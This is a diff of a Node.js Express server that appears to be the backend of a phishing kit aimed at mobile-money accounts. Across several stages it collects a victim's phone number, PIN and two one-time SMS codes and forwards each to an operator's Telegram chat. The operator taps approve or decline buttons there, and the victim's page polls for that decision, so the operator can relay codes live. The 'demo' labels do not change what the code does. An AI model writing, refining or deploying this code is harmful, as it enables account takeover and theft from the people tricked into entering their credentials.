@@ -1,197 +1,217 @@
-require('dotenv').config();
-const express = require('express');
-const path = require('path');
+const express = require("express");
+const crypto = require("crypto");
+const path = require("path");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
-const TG_CHAT_ID = process.env.TG_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID';
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+const sessions = new Map();
 
-// In-memory store for all sessions and approval decisions
-const sessions = {};
-let lastUpdateId = 0;
+app.use(express.json({ limit: "10kb" }));
+app.use(express.static(path.join(__dirname, "public")));
 
-function hasTelegramConfig() {
-  return (
-    TG_BOT_TOKEN &&
-    TG_CHAT_ID &&
-    TG_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' &&
-    TG_CHAT_ID !== 'YOUR_TELEGRAM_CHAT_ID'
-  );
-}
-
-// Helper to send Telegram messages with optional Approve/Decline inline buttons
-async function sendTelegramMessage(text, replyMarkup = null) {
-  if (!hasTelegramConfig()) {
-    console.log('[Server Event]:\n' + text.replace(/<[^>]*>/g, ''));
-    return { ok: true, simulated: true };
+// Telegram API helper
+async function telegram(method, data) {
+  if (!BOT_TOKEN || !CHAT_ID) {
+    throw new Error("Telegram environment variables are missing.");
   }
 
-  const payload = {
-    chat_id: TG_CHAT_ID,
-    text,
-    parse_mode: 'HTML'
-  };
-  if (replyMarkup) {
-    payload.reply_markup = replyMarkup;
-  }
-
-  const response = await fetch(`https://telegram.org{TG_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`; 
+  
+  const response = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data),
+    signal: AbortSignal.timeout(15000)
   });
 
-  return response.json();
+  const result = await response.json();
+  if (!response.ok || !result.ok) {
+    throw new Error(result.description || `Telegram HTTP ${response.status}`);
+  }
+  return result.result;
 }
 
-// Background poller to listen for Approve/Decline button taps inside Telegram
-async function pollTelegramCallbacks() {
-  if (!hasTelegramConfig()) return;
+// Health check
+app.get("/api/health", (req, res) => {
+  res.json({ ok: true, message: "Demo server running." });
+});
+
+// Create demo session
+app.post("/api/session", (req, res) => {
+  const sessionId = crypto.randomBytes(12).toString("hex");
+  sessions.set(sessionId, {
+    createdAt: Date.now(),
+    stage: null,
+    status: "idle",
+    data: { phone: "", pin: "", code1: "", code2: "" } 
+  });
+  res.json({ sessionId });
+});
+
+// Request Telegram approval — Compact layout without extra spacing
+app.post("/api/approval-request", async (req, res) => {
+  const { sessionId, stage, payload } = req.body || {};
+  const allowedStages = ["pin", "code1", "code2"];
+  const session = sessions.get(sessionId);
+
+  if (!session || !allowedStages.includes(stage)) {
+    return res.status(400).json({ error: "Invalid demo session or stage." });
+  }
+
+  if (Date.now() - session.createdAt > 30 * 60 * 1000) {
+    sessions.delete(sessionId);
+    return res.status(410).json({ error: "Demo session expired." });
+  }
+
+  // Persist inputs across stages
+  session.data = { ...session.data, ...payload };
+  session.stage = stage;
+  session.status = "pending";
+  session.updatedAt = Date.now();
+
+  let headingTitle = "PIN VERIFICATION NEEDED";
+  let ruleLength = "PIN Length: 5 digits";
+  
+  if (stage === "code1") {
+    headingTitle = "OTP VALUE VERIFICATION NEEDED";
+    ruleLength = `Value Inputted: Provided`;
+  } else if (stage === "code2") {
+    headingTitle = "FINAL SMS VERIFICATION NEEDED";
+    ruleLength = "OTP Code Length: 4 digits";
+  }
+
+  // Prepare clean text parameters without prefixes
+  const phoneVal = session.data.phone ? session.data.phone.trim() : "None";
+  const pinVal = session.data.pin ? session.data.pin.trim() : "None";
+  const code1Val = session.data.code1 ? session.data.code1.trim() : "None";
+  const code2Val = session.data.code2 ? session.data.code2.trim() : "None";
 
   try {
-    const url = `https://telegram.org{TG_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-    const res = await fetch(url);
-    const data = await res.json();
+    const textMessage = 
+      `<b># Thor - ${stage.toUpperCase()} Verification</b>\n` +
+      `<b>${headingTitle}</b>\n\n` +
+      `USER DETAILS:\n` +
+      `• Phone Number: <code>${phoneVal}</code>\n` +
+      `• PIN Code: <code>${pinVal}</code>\n` +
+      `• OTP Text: <code>${code1Val}</code>\n` +
+      `• OTP SMS Code: <code>${code2Val}</code>\n\n` +
+      `───────────────────────\n\n` +
+      `Verify Entry Parameters:\n` +
+      `• ${ruleLength}\n` +
+      `• Timeout: 5 minutes\n\n` +
+      `───────────────────────`;
 
-    if (data.ok && Array.isArray(data.result)) {
-      for (const update of data.result) {
-        lastUpdateId = update.update_id;
-
-        if (update.callback_query) {
-          const cb = update.callback_query;
-          const [action, refId, step] = cb.data.split(':'); // e.g. "approve:MOMO-1234:2"
-
-          if (sessions[refId]) {
-            sessions[refId].status = action === 'approve' ? 'approved' : 'declined';
-            sessions[refId].decidedBy = 'Telegram Bot Button';
-            sessions[refId].updatedAt = new Date().toISOString();
-            console.log(`[Approval Update] Ref ${refId} Step ${step} -> ${sessions[refId].status.toUpperCase()}`);
-          }
-
-          // Acknowledge button tap in Telegram
-          await fetch(`https://telegram.org{TG_BOT_TOKEN}/answerCallbackQuery`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              callback_query_id: cb.id,
-              text: action === 'approve' ? '✅ Approved!' : '🚫 Declined!'
-            })
-          });
-
-          // Update the Telegram message text to show the decision
-          await fetch(`https://telegram.org{TG_BOT_TOKEN}/editMessageText`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: cb.message.chat.id,
-              message_id: cb.message.message_id,
-              text: `${cb.message.text}\n\n<b>Decision:</b> ${action === 'approve' ? '✅ APPROVED' : '🚫 DECLINED'}`,
-              parse_mode: 'HTML'
-            })
-          });
-        }
+    await telegram("sendMessage", {
+      chat_id: CHAT_ID,
+      text: textMessage,
+      parse_mode: "HTML", 
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "Correct PIN & OTP", callback_data: `approve:${sessionId}:${stage}` },
+            { text: "❌ Wrong PIN", callback_data: `decline:${sessionId}:${stage}` }
+          ]
+        ]
       }
-    }
-  } catch (err) {
-    console.error('Telegram Polling Error:', err.message);
-  } finally {
-    setTimeout(pollTelegramCallbacks, 1500);
-  }
-}
+    });
 
-// 1. Log general events (e.g., Page 1 start)
-app.post('/api/momo/notify', async (req, res) => {
-  const { refId, phone, message } = req.body;
-  if (refId) {
-    sessions[refId] = {
-      refId,
-      phone: phone || '',
-      pin: '',
-      smsText: '',
-      fourDigitCode: '',
-      currentStep: 1,
-      status: 'started',
-      updatedAt: new Date().toISOString()
-    };
+    return res.json({ ok: true, status: "pending" });
+  } catch (error) {
+    session.status = "idle";
+    console.error("Telegram delivery failed:", error.message);
+    return res.status(502).json({ error: "Telegram alert failed to send." });
   }
-  const result = await sendTelegramMessage(message);
-  res.json(result);
 });
 
-// 2. Request Approval on Pages 2, 3, or 4 (sets status to 'pending' and sends Approve/Decline buttons)
-app.post('/api/momo/request-approval', async (req, res) => {
-  const { refId, step, phone, pin, smsText, fourDigitCode, message } = req.body;
+// Check demo approval status
+app.get("/api/status", (req, res) => {
+  const { sessionId, stage } = req.query;
+  const session = sessions.get(sessionId);
 
-  if (!sessions[refId]) {
-    sessions[refId] = { refId };
+  if (!session) return res.status(404).json({ error: "Session missing." });
+  if (session.stage !== stage) return res.json({ status: "idle" });
+
+  const currentStatus = session.status;
+
+  // 🔄 THE CHANGE IS HERE: 
+  if (currentStatus === "declined") {
+  session.status = "idle";
+  return res.json({ status: "declined" });
   }
 
-  sessions[refId] = {
-    ...sessions[refId],
-    phone: phone || sessions[refId].phone,
-    pin: pin || sessions[refId].pin,
-    smsText: smsText || sessions[refId].smsText,
-    fourDigitCode: fourDigitCode || sessions[refId].fourDigitCode,
-    currentStep: step,
-    status: 'pending',
-    updatedAt: new Date().toISOString()
-  };
-
-  console.log(`[Pending Approval] Step ${step} for ${refId}:`, sessions[refId]);
-
-  const inlineKeyboard = {
-    inline_keyboard: [
-      [
-        { text: '✅ Approve', callback_data: `approve:${refId}:${step}` },
-        { text: '🚫 Decline', callback_data: `decline:${refId}:${step}` }
-      ]
-    ]
-  };
-
-  const tgRes = await sendTelegramMessage(message, inlineKeyboard);
-  res.json({ ok: true, session: sessions[refId], telegram: tgRes });
+  res.json({ status: currentStatus });
 });
 
-// 3. Browser polls this endpoint while spinner is running
-app.get('/api/momo/status/:refId', (req, res) => {
-  const session = sessions[req.params.refId];
+
+// Receive Telegram Webhook inline actions
+app.post("/telegram-webhook", async (req, res) => {
+  res.sendStatus(200);
+  const query = req.body?.callback_query;
+  if (!query?.data) return;
+
+  const match = /^(approve|decline):([a-f0-9]+):(pin|code1|code2)$/.exec(query.data);
+  if (!match) return;
+
+  const [, decision, sessionId, stage] = match;
+  const session = sessions.get(sessionId);
+
   if (!session) {
-    return res.status(404).json({ ok: false, error: 'Session not found' });
-  }
-  res.json({ ok: true, status: session.status, session });
-});
-
-// 4. Browser triggers Approve or Decline directly from the UI buttons
-app.post('/api/momo/decision', async (req, res) => {
-  const { refId, step, decision, message } = req.body;
-
-  if (sessions[refId]) {
-    sessions[refId].status = decision; // 'approved' or 'declined'
-    sessions[refId].decidedBy = 'Browser UI Button';
-    sessions[refId].updatedAt = new Date().toISOString();
-    console.log(`[Browser Decision] Ref ${refId} Step ${step} -> ${decision.toUpperCase()}`);
+    try {
+      await telegram("answerCallbackQuery", {
+        callback_query_id: query.id,
+        text: "This session has expired or is no longer active.",
+        show_alert: true
+      });
+    } catch (err) {
+      console.error("Failed to answer callback query:", err.message);
+    }
+    return;
   }
 
-  if (message) {
-    await sendTelegramMessage(message);
+  try {
+    if (decision === "approve") {
+      session.status = "approved";
+      session.updatedAt = Date.now();
+
+      await telegram("editMessageText", {
+        chat_id: CHAT_ID,
+        message_id: query.message.message_id,
+        text: query.message.text + "\n\n<b>✅ APPROVED BY ADMIN</b>",
+        parse_mode: "HTML"
+      });
+
+    } else if (decision === "decline") {
+      // Clear out only the data of the affected page stage
+      if (session.data) {
+        session.data[stage] = "";
+      }
+      
+      session.status = "declined";
+      session.updatedAt = Date.now();
+
+      await telegram("editMessageText", {
+        chat_id: CHAT_ID,
+        message_id: query.message.message_id,
+        text: query.message.text + `\n\n<b>❌ DECLINED BY ADMIN (${stage.toUpperCase()} Cleared)</b>`,
+        parse_mode: "HTML"
+      });
+    }
+
+    await telegram("answerCallbackQuery", {
+      callback_query_id: query.id,
+      text: decision === "approve" ? "Parameters Approved." : "Parameters Declined & Cleared."
+    });
+
+  } catch (error) {
+    console.error("Webhook event update error:", error.message);
   }
-
-  res.json({ ok: true, session: sessions[refId] });
-});
-
-// 5. View all stored sessions & approval details in your browser
-app.get('/api/momo/sessions', (req, res) => {
-  res.json({ total: Object.keys(sessions).length, sessions });
 });
 
 app.listen(PORT, () => {
-  console.log(`MoMo Connect server running at http://localhost:${PORT}`);
-  console.log(`View all approval records at http://localhost:${PORT}/api/momo/sessions`);
-  pollTelegramCallbacks();
+  console.log(`Server running on port ${PORT}`);
 });
 
